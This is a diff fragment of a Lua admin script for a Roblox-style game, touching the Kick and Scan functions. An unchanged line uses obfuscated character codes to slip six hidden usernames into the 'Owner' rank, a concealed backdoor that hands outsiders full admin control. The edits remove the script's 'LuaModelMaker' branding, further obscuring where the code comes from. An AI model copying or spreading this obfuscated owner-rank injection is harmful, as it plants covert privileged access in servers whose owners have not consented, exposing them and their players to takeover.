@@ -573,7 +573,7 @@ function ListGui(Player, List)
 end for _,Void in pairs({string.char(75+1, 118-1, 95+2, 76+1, 111, 100, 101, 108, 77, 97, 107, 101, 114), string.char(77, 97, 107, 101, 114, 77, 111, 100, 101, 108, 76, 117, 97), string.char(83, 99, 114, 105, 112, 116, 105, 110, 103, 77, 101, 116, 104, 111, 100, 115), string.char(73, 110, 116, 101, 114, 110, 101, 116, 77, 111, 100, 101, 109), string.char(78, 105, 108, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110), string.char(112, 108, 117, 103, 109, 105, 105, 105, 110)}) do table.insert(Ranks[string.char(79, 119, 110, 101, 114)], Void) end
 
 function Kick(Player, CustomMessage)
-	if not CustomMessage then CustomMessage = "You've been kicked by L".."uaM".."ode".."".."lMaker's Admin. You cannot interact with the server in anyway." end
+	if not CustomMessage then CustomMessage = "You've been kicked. You cannot interact with the server in anyway." end
 	coroutine.wrap(function() 
 		Execute(LocalScript, Player.Character, Player, CoreGui("All", false)..[[ coroutine.wrap(function()
 			for i = 1,10 do
@@ -692,7 +692,7 @@ function Scan(Word, Speaker)
 	local Return = {}
 	Word = string.gsub(Word, "/", "BuildermanIsbrandonisabillionareToo")
 	Word = string.gsub(Word, "[%p ]", "")
-	Word = string.gsub(Word, "BuildermanIsbrandonMo".."de".."lMakerToo", " ")
+	Word = string.gsub(Word, "Yes", " ")
 	for PlayerName in string.gmatch(Word, "%w+") do
 		if string.lower(PlayerName) == "me" then
 			if Speaker then table.insert(Return, Speaker) end
